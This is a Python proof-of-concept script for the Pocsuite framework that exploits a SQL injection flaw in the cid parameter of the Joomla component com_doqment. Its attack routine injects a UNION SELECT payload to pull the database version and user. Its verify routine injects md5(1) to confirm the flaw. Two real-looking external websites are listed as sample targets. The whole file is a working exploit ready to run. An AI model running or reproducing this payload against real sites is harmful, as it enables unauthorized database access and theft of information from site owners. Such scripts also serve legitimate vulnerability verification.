#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '67389'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-01-03'
    createDate = '2016-01-15'
    updateDate = '2016-01-15'
    references = ['http://www.sebug.net/vuldb/ssvid-67389']
    name = 'Joomla Component com_doqment (cid) SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component com_doqment'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla Component com_doqment的参数cid过滤不严格，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行任意SQL指令，获取敏感信息。
    '''
    samples = ['http://www.ecosys-tec.com','http://novocement.ru',]

    def _attack(self):
        #利用注入漏洞读取数据库信息
        result = {}
        #利用的payload
        payload="-11/**/union/**/select/**/1,2,concat(0x247e7e7e24,version(),0x2a2a2a,user(),0x247e7e7e24),4,5,6,7,8--"
        #漏洞地址
        exploit='/index.php?option=com_doqment&cid='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #正则表达式
        par="\$~~~\$([0-9a-zA-Z_].*)\*\*\*([0-9a-zA-Z_].*)\$~~~\$"
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否有特殊字符串
        if '$~~~$' in resp.content:
            match=re.search(par,resp.content,re.I|re.M)
            if match:
                #漏洞利用成功
                result['DatabaseInfo']={}
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(1)
                #数据库用户
                result['DatabaseInfo']['Username']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #利用注入漏洞计算md5(1)
        result = {}
        #利用的payload
        payload='-11/**/union/**/select/**/1,2,md5(1),4,5,6,7,8--'
        #漏洞地址
        exploit='/index.php?option=com_doqment&cid='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否有特殊字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)